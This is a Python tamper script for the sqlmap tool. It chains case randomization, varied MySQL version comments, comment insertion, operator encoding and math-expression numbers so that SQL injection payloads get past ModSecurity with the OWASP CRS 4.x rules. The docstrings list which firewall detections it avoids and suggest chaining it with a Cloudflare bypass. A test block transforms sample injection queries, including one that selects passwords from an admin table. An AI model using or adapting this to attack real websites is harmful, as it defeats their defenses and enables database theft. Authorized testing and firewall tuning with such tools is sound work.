"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: modsec_crs2026.py
Description: ModSecurity + OWASP CRS 4.x bypass with smart comment usage
Author: Regaan
Priority: HIGHEST

ModSecurity CRS specific behaviors:
- Detects SLEEP(), BENCHMARK() (avoid raw)
- Blocks stacked queries without proper delimiters
- Heavy comment usage but watches for patterns
- Randomcase detection is weak

Techniques:
1. Avoid common CRS triggers (no raw SLEEP/BENCHMARK)
2. Randomized case (CRS weak against this)
3. Smart context-aware space replacement (not in strings)
4. Variable version comments
5. Operator encoding only in WHERE
6. Comment chaos with varied patterns

Chain with: --tamper=modsec_crs2026,cloudflare2025 for layered bypass
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_version_comment_vary_rule,
    create_comment_chaos_rule,
    create_value_encode_rule,
    create_case_alternate_rule,
    create_numeric_obfuscation_rule,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    ModSecurity + OWASP CRS 4.x bypass
    
    Focuses on bypassing open-source WAF rules:
    1. Case alternation FIRST (CRS is weak here)
    2. Variable version comments (varied versions)
    3. Comment chaos between tokens
    4. Operator encoding (WHERE only)
    5. Numeric to math expressions
    
    CRS specific bypasses:
    - Avoids triggering common sleep/benchmark rules
    - Uses math expressions instead of raw numbers
    - Heavy case randomization (CRS tracks exact keywords)
    - Varied comment styles to break patterns
    
    Example:
        Input:  SELECT * FROM users WHERE id=1
        Output: Case randomized, comments varied, operators encoded
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order for ModSec CRS
    
    # 1. Case alternation FIRST (most effective against CRS)
    transformer.add_rule(create_case_alternate_rule())
    
    # 2. Variable version comments
    transformer.add_rule(create_version_comment_vary_rule())
    
    # 3. Comment chaos (varied patterns)
    transformer.add_rule(create_comment_chaos_rule(seed="modsec2026"))
    
    # 4. Encode operators
    transformer.add_rule(create_value_encode_rule())
    
    # 5. Numeric obfuscation with math expressions
    transformer.add_rule(create_numeric_obfuscation_rule(style="math"))
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "UNION SELECT password FROM admin",
        "SELECT * FROM users WHERE active=1 AND role='admin'",
        "SELECT * FROM users WHERE id>=5",
    ]
    
    print("=" * 70)
    print("ModSecurity CRS 2026 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
